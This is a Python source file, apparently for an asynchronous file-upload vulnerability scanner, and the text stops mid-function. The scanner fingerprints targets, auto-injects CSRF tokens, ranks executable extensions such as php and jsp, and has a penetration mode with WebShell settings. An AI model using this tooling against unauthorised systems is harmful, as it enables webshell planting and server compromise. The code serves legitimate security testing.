#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
异步扫描器 - 整合upload_forge功能
"""

import asyncio
import random
import uuid
from urllib.parse import quote, urljoin
from typing import List, Optional, Callable
from datetime import datetime

from .async_http_client import AsyncHTTPClient
from .async_response_analyzer import AsyncResponseAnalyzer, ScanHttpResponse, wrap_raw_response
from .form_parser import FormParser
from .fingerprinter import (
    EnvironmentFingerprinter,
    EnvironmentProfile,
    filter_payloads_by_profile,
)
from .raw_http_client import RawHTTPClient
from .models import (
    ScanResult, VulnerabilityFinding, TrafficLog,
    RISK_CRITICAL, RISK_HIGH, RISK_MEDIUM, RISK_LOW,
    CONFIDENCE_CERTAIN, CONFIDENCE_HIGH, CONFIDENCE_MEDIUM
)
from .url_guard import safe_verification_url
from .request_template import RequestTemplate
from .request_mutator import mutate_file
from .request_builder import build_raw_request


def _cap_bytes(data: bytes, limit: int = 1_048_576) -> bytes:
    """【修复 P2】结果 dict 的 bytes 字段统一 1MB 封顶（判定用实时对象不受影响）"""
    try:
        return data[:limit] if data and len(data) > limit else (data or b"")
    except Exception:
        return b""


class AsyncScanner:
    """异步文件上传漏洞扫描器"""
    
    def __init__(self):
        self.analyzer = AsyncResponseAnalyzer()
        self.results = []
        self.running = False
        self._on_log_callback = None
        self.max_payloads = 1200  # 默认Payload数量限制（与GUI一致）
        # 【新增】扫描状态保存，支持继续扫描
        self._last_progress = 0  # 上次扫描到的位置
        self._saved_payloads = []  # 保存的payload列表
        self._scan_config = {}  # 保存的扫描配置
        self._scan_nonce = ""
        # 由 strategy_mode 控制：自适应模式允许在“真实验证成功”后跳过同后缀余项；
        # 全量模式必须逐项请求，不能启用早停。
        self.enable_extension_early_stop = False
    
    async def scan(self, 
                   target_url: str, 
                   file_param: str = "file",
                   upload_dir: Optional[str] = None,
                   proxies: Optional[dict] = None,
                   headers: Optional[dict] = None,
                   cookies: Optional[str] = None,
                   on_log_callback: Optional[Callable[[str], None]] = None,
                   on_traffic_callback: Optional[Callable[[TrafficLog], None]] = None,
                   on_finding_callback: Optional[Callable[[VulnerabilityFinding], None]] = None,
                   on_result_callback: Optional[Callable[[dict], None]] = None,
                   on_traffic_update_callback: Optional[Callable[[int, bool], None]] = None,
                   max_payloads: int = 1200,
                   progress_callback: Optional[Callable[[str, int], None]] = None,
                   timeout: int = 30,
                   use_raw_multipart: bool = True,
                   use_fingerprint: bool = True,
                   selected_extensions: Optional[List[str]] = None,
                   extra_fields: Optional[dict] = None,
                   scan_mode: str = "security",  # 【新增】security / penetration
                   webshell_config: Optional[dict] = None,
                   request_template: Optional[RequestTemplate] = None,
                   custom_payloads: Optional[List[dict]] = None,
                   strategy_mode: str = "adaptive",
                   resume_from: int = 0,
                   smart_extensions: bool = True,  # 【新增】smart_extensions 智能后缀优选
                   resume_order_sig: str = "",  # 【新增】断点续扫的 payload 顺序签名（上轮 stop 时记录）
                   verify_ssl: bool = True,  # 【新增】TLS 证书校验开关（自签名靶场需显式关闭）
                   log_id_base: int = 0) -> ScanResult:  # 【新增】流量日志 id 起始偏移（续扫续号，防跨轮撞号）
        """执行扫描"""
        self.running = True
        self._scan_nonce = uuid.uuid4().hex[:10]
        start_time = datetime.now()
        if max_payloads is None:
            max_payloads = self.max_payloads
        
        if on_log_callback:
            on_log_callback("=== AsyncScanner.scan() 开始 ===")
            on_log_callback(f"参数: target_url={target_url}, file_param={file_param}")
            on_log_callback(f"max_payloads={max_payloads}, use_fingerprint={use_fingerprint}")
            on_log_callback(f"running状态: {self.running}")
            on_log_callback(f"本轮验证标识: {self._scan_nonce}")
        
        # 解析cookies
        cookie_dict = {}
        if cookies:
            for cookie in cookies.split(';'):
                if '=' in cookie:
                    k, v = cookie.strip().split('=', 1)
                    cookie_dict[k] = v
        
        # 创建HTTP客户端
        engine = AsyncHTTPClient(proxies=proxies, headers=headers, cookies=cookie_dict, timeout=timeout, verify_ssl=verify_ssl)
        engine.set_log_callback(on_traffic_callback)
        # 【修复 P1】续扫续号：每轮新建 engine 会使 request_counter 从 1 重编，
        # 与 GUI 流量面板里上一轮的 log_id 撞号，颜色/跳转/详情联动全部命中旧行。
        # 续扫时由调用方传入上轮最大 id 作为起始偏移，保证 id 全程唯一。
        try:
            engine.request_counter = max(0, int(log_id_base))
        except Exception:
            engine.request_counter = 0
        
        scan_result = ScanResult(target=target_url, start_time=start_time)
        self._traffic_cb = on_traffic_callback
        self._traffic_update_cb = on_traffic_update_callback
        self._on_result_callback = on_result_callback
        self._on_finding_callback = on_finding_callback
        self._on_log_callback = on_log_callback
        self._request_template = request_template
        self._use_raw = False
        self._raw_client: Optional[RawHTTPClient] = None
        if on_log_callback and proxies:
            on_log_callback(f"已启用代理: {', '.join(f'{k}={v}' for k, v in proxies.items())}")
        
        upload_url = target_url
        extra_fields = dict(extra_fields or {})
        if request_template is not None:
            request_template.validate()
            target_url = request_template.url
            upload_url = request_template.url
            if request_template.file_parts:
                file_param = request_template.file_parts[0].field
            extra_fields.update(request_template.form_fields)

        profile = EnvironmentProfile()
        if use_fingerprint and request_template is None:
            try:
                if on_log_callback:
                    on_log_callback("正在获取目标页面进行环境指纹检测...")
                
                # 添加超时保护，避免指纹检测卡住
                pre = await asyncio.wait_for(engine.get(target_url), timeout=30)
                
                if on_log_callback:
                    on_log_callback("正在分析环境指纹...")
                    
                fp = EnvironmentFingerprinter()
                profile = fp.fingerprint(target_url, pre)
                
                if on_log_callback:
                    on_log_callback(fp.get_fingerprint_summary().replace("\n", " | "))

                if on_log_callback:
                    on_log_callback("正在解析页面表单...")
                    
                try:
                    parser = FormParser(None)
                    forms = parser.find_upload_forms(target_url, pre.text)
                    
                    if on_log_callback:
                        on_log_callback(f"发现 {len(forms)} 个上传表单")
                        
                except Exception as e:
                    if on_log_callback:
                        on_log_callback(f"表单解析失败: {e}")
                    forms = []

                picked = None
                if forms:
                    # 优先选择包含当前 file_param 的表单；其次选第一个上传表单
                    for f in forms:
                        for ff in (f.get("file_fields") or []):
                            if (ff.get("name") or "").strip() == (file_param or "").strip():
                                picked = f
                                break
                        if picked:
                            break
                    if not picked:
                        picked = forms[0]

                # 【新增】JS 渲染上传组件兜底：layui(upload.render)/fetch/axios 等
                # 把上传接口写在页面 <script> 里，经典 <form> 解析不到。无表单时
                # 用 collect_upload_hints 的 JS 推测候选补位（仅同源，过门禁）。
                if picked is None:
                    try:
                        hints = FormParser.collect_upload_hints(target_url, pre.text)
                        js_hints = [h for h in hints if h.get("kind") == "api"]
                        for h in js_hints:
                            hint_url = h.get("url") or ""
                            if hint_url and safe_verification_url(hint_url, target_url):
                                upload_url = hint_url
                                if h.get("file_field"):
                                    file_param = h["file_field"]
                                if on_log_callback:
                                    on_log_callback(
                                        f"已从页面 JS 推断上传接口: {upload_url}  file字段={file_param}"
                                        f"（来源: {h.get('source', 'js')}，JS 渲染上传组件需人工复核）"
                                    )
                                break
                    except Exception as e:
                        if on_log_callback:
                            on_log_callback(f"JS 上传接口推测失败: {e}")

                if picked:
                    discovered_upload_url = picked.get("action") or target_url
                    # 页面表单属于不可信远程输入。自动发现只能跟随与初始
                    # 目标严格同源的 action，避免恶意页面把扫描器导向内网或
                    # 其他站点；需要跨站上传时，用户可显式填写目标或导入 Raw 请求。
                    if safe_verification_url(discovered_upload_url, target_url):
                        upload_url = discovered_upload_url
                    else:
                        if on_log_callback:
                            on_log_callback(
                                f"[安全] 已忽略自动发现的跨域/私网上传地址: {discovered_upload_url}"
                            )
                        picked = None

                if picked:
                    ff_list = picked.get("file_fields") or []
                    if ff_list and not (file_param or "").strip():
                        file_param = (ff_list[0].get("name") or "file").strip() or "file"
                    elif ff_list and all((ff.get("name") or "").strip() != (file_param or "").strip() for ff in ff_list):
                        # 若页面只有一个 file 字段，自动修正 file_param
                        if len(ff_list) == 1:
                            file_param = (ff_list[0].get("name") or "file").strip() or "file"
                    # 页面自动推断字段作为默认值，调用方显式传入的字段优先，
                    # 避免真实抓包/自定义模板中的 CSRF、action 等被覆盖。
                    inferred_fields = dict(picked.get("other_fields") or {})
                    inferred_fields.update(extra_fields)
                    extra_fields = inferred_fields
                    # 自动提取并注入 CSRF token（避免对有 CSRF 保护的目标全部 403）
                    try:
                        fp_parser = FormParser(None)
                        csrf_tokens = fp_parser.extract_csrf_token(pre.text)
                        if csrf_tokens:
                            extra_fields.update(csrf_tokens)
                            if on_log_callback:
                                on_log_callback(f"检测到 CSRF Token，已自动注入: {', '.join(csrf_tokens.keys())}")
                    except Exception:
                        pass
                    if on_log_callback and upload_url != target_url:
                        on_log_callback(f"已从页面表单推断上传接口: {upload_url}  file字段={file_param}")
                    if on_log_callback and extra_fields:
                        on_log_callback(f"表单附带字段: {', '.join(list(extra_fields.keys())[:8])}")
            except Exception as ex:
                if on_log_callback:
                    on_log_callback(f"环境指纹预检失败（使用默认策略）: {ex}")
        
        if use_raw_multipart and request_template is None:
            proxy_str = None
            if proxies:
                proxy_str = proxies.get("http://") or proxies.get("https://")
            try:
                self._raw_client = RawHTTPClient(timeout=timeout, proxy=proxy_str, verify_ssl=verify_ssl)
                self._raw_client.set_cookie(cookie_dict)
                if headers:
                    for hk, hv in headers.items():
                        self._raw_client.set_header(hk, hv)
                self._raw_client.set_header("Referer", target_url)
                self._use_raw = True
            except Exception as ex:
                if on_log_callback:
                    on_log_callback(f"Raw 客户端初始化失败，回退 httpx 上传: {ex}")
                self._raw_client = None
                self._use_raw = False
        
        if on_log_callback:
            on_log_callback("正在生成payloads...")
        builtin_payloads = self._generate_payloads(None, selected_extensions, scan_mode, webshell_config)
        custom_payloads = self._normalize_custom_payloads(custom_payloads, selected_extensions)
        if strategy_mode not in {"adaptive", "full", "manual"}:
            strategy_mode = "adaptive"
        self.enable_extension_early_stop = strategy_mode == "adaptive"

        if strategy_mode == "manual":
            raw_list = custom_payloads
        else:
            # 自定义项优先，确保 payload 上限较小时也不会被内置词库挤掉。
            raw_list = self._merge_payloads(custom_payloads, builtin_payloads)
        if on_log_callback:
            on_log_callback(
                f"Payload 编排: 模式={strategy_mode}，内置={len(builtin_payloads)}，"
                f"自定义={len(custom_payloads)}，去重后={len(raw_list)}"
            )
        
        if strategy_mode == "adaptive" and use_fingerprint:
            if on_log_callback:
                on_log_callback(
                    "智能策略: 按环境指纹排序并排除不适用的内置变体；"
                    "自定义 Payload 始终保留"
                )
            builtin_only = [p for p in raw_list if p.get("source") != "custom"]
            selected_builtin = filter_payloads_by_profile(
                builtin_only, profile, max_payloads, apply_disable=True, prioritize=True
            )
            payloads = self._merge_payloads(custom_payloads, selected_builtin)[:max_payloads]
            if on_log_callback:
                on_log_callback(
                    f"智能策略结果: {len(payloads)} 个；环境={profile.server}/"
                    f"{profile.os}/{profile.language}，置信度={profile.fingerprint_confidence:.2f}"
                )
        else:
            payloads = raw_list[:max_payloads]
            if on_log_callback:
                on_log_callback(f"{strategy_mode} 模式不裁剪策略，实际请求: {len(payloads)} 个")

        # 【新增】智能后缀优选：指纹检测已完成（profile 已生成）、payload 已编排完毕，
        # 在进入主循环前按检测到的后端语言把语言相关扩展名的 payload 前置。
        # 只重排不删除任何 payload；指纹关闭或未识别时保持原顺序。
        if smart_extensions and payloads:
            lang_ext_map = {
                "php": {"php", "phtml", "pht", "phar", "php3", "php4", "php5", "php7", "phps"},
                "jsp": {"jsp", "jspx", "jsw", "jsv", "jspf", "war"},
                "aspx": {"aspx", "ascx", "ashx", "asmx", "asax"},
                "asp": {"asp", "asa", "cer"},
                "python": {"py"},
                "perl": {"pl", "cgi"},
            }
            lang_key = (getattr(profile, "language", "") or "").strip().lower()
            preferred_exts = lang_ext_map.get(lang_key)
            if preferred_exts:
                def _payload_ext(p: dict) -> str:
                    return str(p.get("ext", "")).lower().lstrip(".")
                # 稳定分区：语言相关扩展名的 payload 排前，其余排后，各自保持原相对顺序
                prioritized = [p for p in payloads if _payload_ext(p) in preferred_exts]
                rest = [p for p in payloads if _payload_ext(p) not in preferred_exts]
                if prioritized and rest:
                    payloads = prioritized + rest
                    if on_log_callback:
                        on_log_callback(
                            f"智能优选: 检测到 {getattr(profile, 'language', '')} 环境，"
                            f"{getattr(profile, 'language', '')} 系 payload 已前置"
                        )

        # 【修复 P1】payload 顺序签名：断点续扫的 resume_from 是"上一轮顺序里的位置"。
        # 重排依赖指纹结果，两轮指纹不同（目标页面变化/开关不同）时顺序不同，
        # 续扫索引会错位跳扫。签名不一致即判定顺序已变化，回退为从头扫描。
        try:
            import hashlib as _hashlib
            order_sig_src = repr([
                (p.get("type"), p.get("ext"), p.get("filename") or "", p.get("desc", ""))
                for p in payloads
            ])
            self._order_sig = _hashlib.sha1(order_sig_src.encode("utf-8")).hexdigest()[:16]
        except Exception:
            self._order_sig = ""
        if resume_from > 0 and resume_order_sig and self._order_sig and resume_order_sig != self._order_sig:
            if on_log_callback:
                on_log_callback(
                    f"[续扫] Payload 顺序已变化（指纹/参数与上轮不同，签名 {resume_order_sig} → {self._order_sig}），"
                    f"续扫偏移失效，回退为从头扫描"
                )
            resume_from = 0

        if on_log_callback:
            on_log_callback(
                f"本轮 Payload: {len(payloads)} 个（指纹={'开' if use_fingerprint else '关'}，"
                f"Raw上传={'开' if self._use_raw else '关'}）"
            )
        
        total = len(payloads)
        resume_from = max(0, min(int(resume_from or 0), total))
        scan_result.stats.update({
            "payloads_planned": total,
            "payloads_tested": 0,
            "payloads_skipped": 0,
            "stopped": False,
            "resume_from": resume_from,
        })
        if total == 0:
            if on_log_callback:
                on_log_callback("警告: 没有可用的payloads，扫描将立即结束")
            # 【修复】提前返回前同样释放客户端，避免 engine/_raw_client 泄漏
            await engine.close()
            if self._raw_client:
                self._raw_client.close()
                self._raw_client = None
            self._use_raw = False
            self._traffic_cb = None
            self._on_log_callback = None
            self.running = False
            return scan_result
        
        inferred_upload_dir = upload_dir  # 自动推断上传目录（用户未填时从响应中提取）

        if on_log_callback:
            on_log_callback(f"开始测试循环，共 {total} 个payloads")
            on_log_callback(f"第一个payload: {payloads[0].get('desc', 'unknown') if payloads else '无'}")
        
        # 发送初始进度，避免看起来卡在0%
        if progress_callback:
            progress_callback("正在初始化扫描...", 0)
        
        # 【智能后缀判定】初始化后缀统计
        ext_stats = {}  # {ext: {"success": 0, "tested": 0, "available": 0, "max_confidence": 0.0}}
        SKIP_CONFIDENCE_THRESHOLD = 0.85  # 置信度超过此值跳过后缀其他payload
        MIN_PAYLOADS_BEFORE_SKIP = 1  # 一个变体已完成真实访问验证即可切换到下一后缀
        
        # 【新增】保存扫描模式配置
        self._scan_mode = scan_mode
        self._webshell_config = webshell_config or {"enabled": False}
        
        if on_log_callback:
            on_log_callback(f"[模式] 测试模式: {'渗透测试' if scan_mode == 'penetration' else '安全测试'}")
            if self._webshell_config.get("enabled"):
                # 【修复】WebShell 密码不再明文写入日志（日志可能随报告导出）：仅保留首字符
                shell_pwd_raw = str(self._webshell_config.get('password', '默认') or '')
                masked_pwd = (shell_pwd_raw[:1] + '***') if shell_pwd_raw else '***'
                on_log_callback(f"[模式] WebShell密码: {masked_pwd}")
                on_log_callback(f"[模式] Shell类型: {self._webshell_config.get('type', '基础')}")

        # 统计每个后缀的payload数量
        for p in payloads:
            ext = p.get('ext', 'unknown')
            if ext not in ext_stats:
                ext_stats[ext] = {"success": 0, "tested": 0, "available": 0, "max_confidence": 0.0}
            ext_stats[ext]["available"] += 1

        # 【修复】定义进度更新间隔
        update_interval = max(1, min(5, total // 100))  # 至少每5个或每1%更新一次

        # 收集需要跳过的后缀
        skipped_exts = set()
        # 结果表保留每个 Payload 的完整证据；漏洞表按最终危险扩展名聚合，
        # 避免双扩展名矩阵把同一影响重复展示数十次。
        reported_finding_keys = set()

        try:
            for i, payload in enumerate(payloads):
                if i < resume_from:
                    continue
                ext = payload.get('ext', 'unknown')
                if self.enable_extension_early_stop and ext in skipped_exts:
                    scan_result.stats["payloads_skipped"] += 1
                    remaining = sum(1 for p in payloads[i + 1:] if p.get('ext') == ext)
                    if on_log_callback and remaining > 0:
                        on_log_callback(f"[跳过] .{ext.lstrip('.')} 后缀已确认，跳过剩余 {remaining} 个 Payload")
                    if progress_callback and (i == 0 or i == total - 1 or (i + 1) % update_interval == 0):
                        progress_callback(f"跳过 .{ext.lstrip('.')} 后缀 ({i + 1}/{total})", int((i + 1) / total * 100))
                    continue
                if on_log_callback and i % 50 == 0:  # 每50个打印一次进度
                    on_log_callback(f"测试进度: {i+1}/{total}")
            
                if not self.running:
                    if on_log_callback:
                        on_log_callback(f"扫描被停止，当前进度: {i}/{total}")
                    # 【修复】保存当前进度以便后续恢复（附顺序签名供续扫校验）
                    self._last_progress = i
                    scan_result.stats["stopped"] = True
                    scan_result.stats["next_payload_index"] = i
                    scan_result.stats["payloads_order_sig"] = getattr(self, "_order_sig", "")
                    break

                # 【修复】更频繁的进度更新
                current_progress = int((i + 1) / total * 100)  # 当前进度基于已完成的比例
                if progress_callback and (i == 0 or (i + 1) % update_interval == 0 or i == total - 1):
                    progress_callback(f"测试 {payload.get('desc', 'unknown')} ({i+1}/{total})", current_progress)
                    # 强制刷新UI
                    if hasattr(progress_callback, '__self__') and hasattr(progress_callback.__self__, 'repaint'):
                        progress_callback.__self__.repaint()

                try:
                    # 添加超时保护，避免单个请求卡住整个扫描
                    result = await asyncio.wait_for(
                        self._test_payload(engine, upload_url, file_param, payload, inferred_upload_dir, extra_fields),
                        timeout=60  # 单个请求最多60秒
                    )
                    scan_result.stats["payloads_tested"] += 1

                    # 【修复 P1】连续网络失败熔断：目标不可达/证书校验失败时每个
                    # payload 都异常返回 None，继续扫完全无意义。连续 ≥5 次失败
                    # 中止扫描并明确提示（含 TLS 开关建议）。
                    if result is None:
                        self._consecutive_net_errors = getattr(self, "_consecutive_net_errors", 0)
                        if self._consecutive_net_errors >= 5:
                            last_err = self._last_net_error or "未知网络错误"
                            msg = (
                                f"[中止] 连续 {self._consecutive_net_errors} 个 payload 网络失败，"
                                f"判定目标不可达，扫描已中止。最后错误: {last_err[:160]}"
                            )
                            if on_log_callback:
                                on_log_callback(msg)
                                on_log_callback(
                                    "[提示] 若目标使用自签名/证书链不完整的 HTTPS，"
                                    "请勾选『忽略TLS证书校验』后重试"
                                )
                            scan_result.stats["aborted_reason"] = msg
                            self.running = False
                            break
                
                    # 自动推断上传目录：从第一个有路径泄露的响应中提取父目录
                    if result and not inferred_upload_dir:
                        leaked = result.get('path_leaked') or ''
                        if leaked and ('/' in leaked or '\\' in leaked):
                            import re as _re
                            _m = _re.match(r'(https?://[^/]+)((?:/[^/]+)*/)', leaked)
                            if _m:
                                inferred_upload_dir = _m.group(1) + _m.group(2).rstrip('/')
                            else:
                                inferred_upload_dir = leaked.rsplit('/', 1)[0] if '/' in leaked else None
                            if inferred_upload_dir and on_log_callback:
                                on_log_callback(f"自动推断上传目录: {inferred_upload_dir}")
                
                    # 【智能后缀判定】更新后缀统计并检查是否需要跳过后缀
                    ext = payload.get('ext', 'unknown')
                    if result:
                        if ext in ext_stats:
                            ext_stats[ext]["tested"] += 1
                        confidence = result.get('success_probability', 0) / 100.0
                        # 仅真实验证成功才允许智能后缀跳过；PENDING/响应推断不能触发。
                        is_success = bool(
                            result.get('verified_upload') or
                            result.get('verified_execution') or
                            result.get('verification', {}).get('verified')
                        )
                    
                        if ext in ext_stats:
                            if confidence > ext_stats[ext]["max_confidence"]:
                                ext_stats[ext]["max_confidence"] = confidence
                            if is_success:
                                ext_stats[ext]["success"] += 1
                    
                        # 检查是否需要跳过后缀的其他payload
                        if self.enable_extension_early_stop and ext not in skipped_exts and ext in ext_stats:
                            stats = ext_stats[ext]
                            # 只有在测试了足够多的payload后才评估
                            if stats["tested"] >= MIN_PAYLOADS_BEFORE_SKIP:
                                # 计算当前后缀的成功率
                                success_count = stats["success"]
                                tested = stats["tested"]
                                current_conf = stats["max_confidence"]
                            
                                # 自适应模式：一旦同后缀已被“实际访问验证”，就不再浪费
                                # 同后缀变体请求；全量模式完全不会走到这里。
                                if success_count >= 1:
                                    skipped_exts.add(ext)
                                    if on_log_callback:
                                        on_log_callback(f"[智能后缀] .{ext.lstrip('.')} 已真实验证，跳过同后缀后续 Payload")
                                    if progress_callback:
                                        progress_callback(f"[智能] .{ext.lstrip('.')} 已确认，扫描下一种后缀", current_progress)
                
                            # 【修复】漏洞检查必须在这里执行，不能在 continue 之后！
                    # 如果是漏洞发现
                    if result and result.get('is_vulnerability'):
                        finding = result.get('finding')
                        if finding:
                            filename = (result.get('filename') or '').lower()
                            final_ext = filename.rsplit('.', 1)[-1] if '.' in filename else 'unknown'
                            finding_key = (target_url.rstrip('/').lower(), final_ext)
                            if finding_key not in reported_finding_keys:
                                reported_finding_keys.add(finding_key)
                                scan_result.findings.append(finding)
                                scan_result.stats["vulns_found"] += 1
                                print(f"[AsyncScanner] 发现漏洞: {finding.name}", flush=True)
                                if self._on_finding_callback:
                                    self._on_finding_callback(finding)
                                if on_log_callback:
                                    on_log_callback(f"[+] 发现漏洞: {finding.name}")
                            else:
                                result['duplicate_finding'] = True

                    # 【修复 低】total_requests 语义修正：此前每 payload +1（实为
                    # payload 数且异常路径漏计），改为反映真实流量条数（含验证 GET）
                    scan_result.stats["total_requests"] = engine.request_counter

                    # 如果当前后缀已被标记为跳过，直接跳到下一个payload（漏洞检查已完成）
                    if self.enable_extension_early_stop and ext in skipped_exts:
                        remaining = sum(1 for p in payloads[i+1:] if p.get('ext') == ext)
                        if remaining > 0 and on_log_callback:
                            on_log_callback(f"[跳过] .{ext.lstrip('.')} 后缀已确认，跳过剩余 {remaining} 个 Payload")
                        continue

                except Exception as e:
                    scan_result.stats["payloads_tested"] += 1
                    if on_log_callback:
                        on_log_callback(f"[-] 测试失败: {str(e)}")


        finally:
            # 【修复 低】扫描结束时以引擎计数器为准回填真实流量总数
            try:
                scan_result.stats["total_requests"] = engine.request_counter
            except Exception:
                pass
            await engine.close()
            if self._raw_client:
                self._raw_client.close()
                self._raw_client = None
            self._use_raw = False
            self._traffic_cb = None
            self._on_log_callback = None
        scan_result.end_time = datetime.now()
        scan_result.stats.setdefault("next_payload_index", total)
        self.running = False
        
        if on_log_callback:
            on_log_callback("扫描完成")
        
        return scan_result
    
    async def _run_blocking(self, fn, *args):
        """在executor中运行阻塞函数"""
        loop = asyncio.get_running_loop()
        # 【修复】添加超时保护，避免永久阻塞
        try:
            result = await asyncio.wait_for(
                loop.run_in_executor(None, lambda: fn(*args)),
                timeout=30  # 最多等待30秒
            )
            return result
        except asyncio.CancelledError:
            raise
        except Exception as e:
            raise
    
    async def _test_payload(self, 
                           engine: AsyncHTTPClient, 
                           target_url: str, 
                           file_param: str, 
                           payload: dict,
                           upload_dir: Optional[str] = None,
                           extra_fields: Optional[dict] = None) -> Optional[dict]:
        """测试单个payload"""
        on_log_callback = self._on_log_callback
        content = payload['content']
        # 【修复】请求按类型自动变化：mime_fake 系仍优先用伪造 Content-Type，
        # 其余 payload 的文件 part Content-Type 按扩展名自动匹配（不再一律
        # application/octet-stream），降低单一指纹特征。
        content_type = payload.get('fake_content_type') or self._mime_for_ext(payload.get('ext', ''))
        
        # 处理文件名
        if payload.get('filename'):
            actual_filename = payload['filename']
        else:
            rand_suffix = str(random.randint(1000, 9999))
            actual_filename = f"test_{rand_suffix}.{payload['ext']}"
        # 共享上传目录中可能存在其他扫描的同名文件；每轮使用唯一前缀，防止 stale 文件污染验证。
        actual_filename = self._unique_scan_filename(actual_filename)
        
        # 【新增】用于保存流量日志对象，以便后续更新 is_success
        _current_log = None
        
        # 上传文件（Raw 字节级 multipart 或 httpx）
        try:
            if self._request_template is not None:
                response = await self._send_template_payload(engine, actual_filename, content, content_type)
            elif self._use_raw and self._raw_client:
                raw_resp = await self._run_blocking(
                    self._raw_client.upload_file,
                    target_url,
                    file_param,
                    actual_filename,
                    content,
                    content_type,
                    self._next_boundary(),  # 【新增】multipart 边界按请求轮换
                    None,
                    extra_fields,
                )
                _current_log = self._log_raw_traffic(
                    engine, "POST", target_url,
                    f"[field={file_param} file={actual_filename}]",
                    raw_resp,
                )
                response = wrap_raw_response(raw_resp, target_url)
                # 防止不同 RawHTTPResponse 包装路径丢失原始请求，显式再次透传。
                response.raw_request = getattr(raw_resp, "raw_request", b"") or b""
            else:
                response = await engine.upload_file(
                    url=target_url,
                    file_field_name=file_param,
                    filename=actual_filename,
                    file_content=content,
                    content_type=content_type,
                    extra_data=extra_fields,
                )
                _current_log = engine.last_traffic_log
        except Exception as e:
            # 【修复 P1】上传异常不能再静默吞掉：网络不可达/证书校验失败时每个
            # payload 都在这里被吞，用户只看到"扫描完成 0 结果"（误导性拉满）。
            # 改为上报到扫描日志（限频前 5 条），并标记连续失败供主循环熔断。
            self._consecutive_net_errors = getattr(self, "_consecutive_net_errors", 0) + 1
            self._last_net_error = f"{type(e).__name__}: {e}"
            if self._on_log_callback and self._consecutive_net_errors <= 5:
                self._on_log_callback(
                    f"[错误] 上传异常 ({actual_filename}): {type(e).__name__}: {str(e)[:160]}"
                )
            return None

        # 成功拿到响应即清零连续失败计数
        self._consecutive_net_errors = 0

        # 分析上传响应
        analysis = self.analyzer.analyze_upload_response(response, actual_filename)
        
        # 如果分析结果为None，设置默认值
        if analysis is None:
            analysis = {'is_success': False, 'success_probability': 0, 'confidence_level': 'low', 
                       'is_redirect': False, 'length': 0, 'decision_reasons': [], 'verify_filenames': [actual_filename]}
        
        followed_redirect = False
        redirect_response = None
        # 增强:安全的重定向跟进：302跳转到详情页时提取文件名
        redirect_location = response.headers.get("location", "") or response.headers.get("Location", "")
        if 300 <= response.status_code < 400 and redirect_location:
            try:
                # 只跟进一次，设置2秒超时避免卡住
                redirect_url = urljoin(target_url, redirect_location)
                if not safe_verification_url(redirect_url, target_url):
                    if self._on_log_callback:
                        self._on_log_callback(f"[安全] 拒绝跨域或私网重定向验证: {redirect_url}")
                    raise ValueError("redirect URL blocked")
                redirect_response = await asyncio.wait_for(
                    engine.check_file_existence(redirect_url),
                    timeout=2.0
                )
                redirect_log = getattr(engine, "last_traffic_log", None)
                if redirect_log is not None and _current_log is not None:
                    redirect_log.parent_log_id = _current_log.id
                    redirect_log.is_verification = True
                if redirect_response and redirect_response.status_code == 200:
                    followed_redirect = True
                    redirect_analysis = self.analyzer.analyze_upload_response(
                        redirect_response, actual_filename
                    )
                    if redirect_analysis.get('path_leaked') and not analysis.get('path_leaked'):
                        analysis['path_leaked'] = redirect_analysis['path_leaked']
                    if redirect_analysis.get('server_filename'):
                        analysis['server_filename'] = redirect_analysis['server_filename']
                    for name in redirect_analysis.get('verify_filenames', []):
                        if name not in analysis['verify_filenames']:
                            analysis['verify_filenames'].append(name)
                    analysis['decision_reasons'].append('已分析重定向后的响应内容')
                    # 从跳转后的响应中提取服务端文件名
                    redirect_server_filename = self.analyzer._extract_server_filename_from_html(redirect_response.text)
                    if redirect_server_filename and redirect_server_filename != actual_filename:
                        analysis['server_filename'] = redirect_server_filename
            except Exception:  # 【修复】裸 except 会吞 CancelledError，导致取消失效
                pass
        # 格式化请求头和响应头
        request_evidence = ""
        if isinstance(response, ScanHttpResponse):
            # 【修复】从 raw_request 中提取真正的 HTTP 请求头和请求体
            req_headers = ""
            req_body = ""
            if hasattr(response, 'raw_request') and response.raw_request:
                raw_req = response.raw_request
                try:
                    # Raw 请求按 latin-1 保留每个字节，保证 multipart body、boundary、Cookie 不丢失。
                    request_evidence = raw_req.decode('latin-1', errors='replace')
                    hdr_end = raw_req.find(b"\r\n\r\n")
                    if hdr_end != -1:
                        # 提取请求头（包括第一行请求行）
                        req_headers = raw_req[:hdr_end].decode('utf-8', errors='replace')
                        # 提取请求体
                        req_body = engine._format_request_body(raw_req[hdr_end + 4:])
                    else:
                        # 如果没有分隔符，整个内容作为请求头
                        req_headers = raw_req.decode('utf-8', errors='replace')
                except Exception:  # 【修复】裸 except 会吞 CancelledError，导致取消失效
                    req_headers = f"POST {target_url} HTTP/1.1"
                    req_body = ""
            else:
                # 没有 raw_request 时的回退
                # Raw 上传路径理论上应携带 raw_request；若第三方响应包装丢失，
                # 仍现场重建一个可复制的完整 multipart 请求。
                try:
                    fallback_template = getattr(self, "_request_template", None)
                    if fallback_template is not None:
                        fallback_template = mutate_file(fallback_template, file_param, actual_filename, content, content_type)
                        raw_fallback = build_raw_request(fallback_template)
                    else:
                        from .request_template import RequestTemplate, FilePart
                        from urllib.parse import urlparse
                        parsed_target = urlparse(target_url)
                        host = parsed_target.netloc
                        boundary = f"----UploadRanger{self._scan_nonce}"
                        body = (
                            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_param}\"; filename=\"{actual_filename}\"\r\n"
                            f"Content-Type: {content_type}\r\n\r\n"
                        ).encode("latin-1", errors="replace") + content + f"\r\n--{boundary}--\r\n".encode()
                        cookie_header = "; ".join(f"{k}={v}" for k, v in getattr(engine, "cookies", {}).items())
                        cookie_line = f"Cookie: {cookie_header}\r\n" if cookie_header else ""
                        raw_fallback = (
                            f"POST {parsed_target.path or '/'}{('?' + parsed_target.query) if parsed_target.query else ''} HTTP/1.1\r\n"
                            f"Host: {host}\r\nUser-Agent: {engine.headers.get('User-Agent', '')}\r\n{cookie_line}"
                            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                            f"Content-Length: {len(body)}\r\n"
                        ).encode("latin-1", errors="replace") + b"\r\n" + body
                    request_evidence = raw_fallback.decode("latin-1", errors="replace")
                    hdr_end = raw_fallback.find(b"\r\n\r\n")
                    req_headers = raw_fallback[:hdr_end].decode("latin-1", errors="replace") if hdr_end >= 0 else request_evidence
                    req_body = engine._format_request_body(raw_fallback[hdr_end + 4:]) if hdr_end >= 0 else ""
                except Exception:
